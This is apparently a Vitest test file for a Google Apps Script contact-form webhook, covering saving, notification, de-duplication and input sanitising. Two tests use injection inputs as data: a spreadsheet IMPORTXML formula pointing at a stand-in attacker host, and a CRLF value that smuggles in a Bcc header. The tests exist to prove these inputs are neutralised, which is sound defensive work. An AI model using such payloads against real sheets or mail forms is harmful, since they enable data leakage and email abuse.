import { describe, it, expect, beforeEach, vi } from "vitest";
import { readFileSync } from "node:fs";
import path from "node:path";
import vm from "node:vm";

/**
 * Runs the real contact-webhook.gs in a sandbox with fake Google services, so
 * the save / notify / de-duplicate behaviour is tested before it is pasted into
 * the Apps Script editor.
 */
const SOURCE = readFileSync(path.join(__dirname, "contact-webhook.gs"), "utf8");

const ID = "3f1c2b9e-8d4a-4f6b-9c2e-1a7b5d0e6f42";
const FIELDS = {
  name: "Jane Tester",
  email: "jane@example.com",
  company: "Acme",
  inquiryType: "business",
  message: "We'd like to discuss an AI agent.",
  submissionId: ID,
};

type Verdict = { ok: boolean; saved: boolean; emailed: boolean; duplicate: boolean; error: string | null };

function makeScript() {
  const rows: unknown[][] = [];
  const emails: Record<string, string>[] = [];
  const store = new Map<string, string>();
  const errors: string[] = [];
  const env = {
    appendFails: false,
    sendFails: false,
    quota: 100,
    lockFree: true,
  };

  const sandbox: Record<string, unknown> = {
    console: { error: (msg: string) => errors.push(String(msg)), log: () => {} },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheets: () => [
          {
            appendRow: (row: unknown[]) => {
              if (env.appendFails) throw Object.assign(new Error("Sheet not found"), { name: "Exception" });
              rows.push(row);
            },
          },
        ],
      }),
    },
    MailApp: {
      getRemainingDailyQuota: () => env.quota,
      sendEmail: (msg: Record<string, string>) => {
        if (env.sendFails) throw Object.assign(new Error(`Invalid email: ${msg.replyTo}`), { name: "Exception" });
        emails.push(msg);
      },
    },
    CacheService: {
      getScriptCache: () => ({ get: (k: string) => store.get(k) ?? null, put: (k: string, v: string) => void store.set(k, v) }),
    },
    LockService: { getScriptLock: () => ({ tryLock: () => env.lockFree, releaseLock: vi.fn() }) },
    Utilities: { getUuid: () => `generated-${rows.length + 1}` },
    ContentService: {
      MimeType: { JSON: "application/json" },
      createTextOutput: (text: string) => ({ text, setMimeType(type: string) { return { text, type }; } }),
    },
  };
  vm.createContext(sandbox);
  vm.runInContext(SOURCE, sandbox);

  const post = (parameter: Record<string, string>) => {
    const out = (sandbox.doPost as (e: unknown) => { text: string; type: string })({ parameter });
    expect(out.type).toBe("application/json");
    return JSON.parse(out.text) as Verdict;
  };
  return { post, rows, emails, errors, env };
}

describe("contact-webhook.gs", () => {
  let s: ReturnType<typeof makeScript>;
  beforeEach(() => {
    s = makeScript();
  });

  it("saves one row and sends one notification, then reports both", () => {
    expect(s.post(FIELDS)).toEqual({ ok: true, saved: true, emailed: true, duplicate: false, error: null });
    expect(s.rows).toHaveLength(1);
    expect(s.rows[0].slice(1)).toEqual(["Jane Tester", "jane@example.com", "Acme", "business", "We'd like to discuss an AI agent."]);
    expect(s.emails).toHaveLength(1);
    expect(s.emails[0].to).toBe("albadareen011@gmail.com");
    expect(s.emails[0].replyTo).toBe("jane@example.com");
    expect(s.emails[0].body).toContain("We'd like to discuss an AI agent.");
  });

  it("reports an email failure explicitly, with the row kept", () => {
    s.env.sendFails = true;
    expect(s.post(FIELDS)).toEqual({ ok: false, saved: true, emailed: false, duplicate: false, error: "email_failed" });
    expect(s.rows).toHaveLength(1);
  });

  it("reports an exhausted MailApp quota without trying to send", () => {
    s.env.quota = 0;
    expect(s.post(FIELDS)).toMatchObject({ ok: false, saved: true, emailed: false, error: "email_quota" });
    expect(s.emails).toHaveLength(0);
  });

  it("reports a failed save and sends no email", () => {
    s.env.appendFails = true;
    expect(s.post(FIELDS)).toEqual({ ok: false, saved: false, emailed: false, duplicate: false, error: "save_failed" });
    expect(s.emails).toHaveLength(0);
  });

  it("a retry after an email failure re-sends only the email, never a second row", () => {
    s.env.sendFails = true;
    s.post(FIELDS);
    s.env.sendFails = false;
    expect(s.post(FIELDS)).toEqual({ ok: true, saved: true, emailed: true, duplicate: true, error: null });
    expect(s.rows).toHaveLength(1);
    expect(s.emails).toHaveLength(1);
  });

  it("a retry after full success changes nothing and still reports success", () => {
    s.post(FIELDS);
    expect(s.post(FIELDS)).toEqual({ ok: true, saved: true, emailed: true, duplicate: true, error: null });
    expect(s.rows).toHaveLength(1);
    expect(s.emails).toHaveLength(1);
  });

  it("treats the id case-insensitively", () => {
    s.post(FIELDS);
    s.post({ ...FIELDS, submissionId: ID.toUpperCase() });
    expect(s.rows).toHaveLength(1);
  });

  it("stores different enquiries separately", () => {
    s.post(FIELDS);
    s.post({ ...FIELDS, submissionId: "9b2d7c1e-4a3f-4e8b-8c6d-2f1e0a9b8c7d" });
    expect(s.rows).toHaveLength(2);
    expect(s.emails).toHaveLength(2);
  });

  it("still saves and notifies for a caller that sends no id", () => {
    const { submissionId, ...withoutId } = FIELDS;
    void submissionId;
    expect(s.post(withoutId)).toMatchObject({ ok: true, saved: true, emailed: true });
  });

  it("answers busy, without writing, when the lock is held", () => {
    s.env.lockFree = false;
    expect(s.post(FIELDS)).toMatchObject({ ok: false, saved: false, error: "busy" });
    expect(s.rows).toHaveLength(0);
  });

  it("rejects a request missing required fields", () => {
    expect(s.post({ ...FIELDS, email: "" })).toMatchObject({ ok: false, saved: false, error: "invalid_input" });
    expect(s.rows).toHaveLength(0);
  });

  it("stores formula-like text as plain text", () => {
    s.post({ ...FIELDS, message: '=IMPORTXML("https://evil.example","//a")', company: "+1 555" });
    expect(s.rows[0][5]).toBe(`'=IMPORTXML("https://evil.example","//a")`);
    expect(s.rows[0][3]).toBe("'+1 555");
  });

  it("keeps line breaks out of the email subject", () => {
    s.post({ ...FIELDS, name: "Jane\r\nBcc: someone@example.com" });
    expect(s.emails[0].subject).not.toMatch(/[\r\n]/);
  });

  it("never logs the enquirer's details", () => {
    s.env.sendFails = true;
    s.post(FIELDS);
    const logged = s.errors.join("\n");
    expect(logged).toContain(ID);
    for (const value of [FIELDS.name, FIELDS.email, FIELDS.company, FIELDS.message]) expect(logged).not.toContain(value);
  });
});
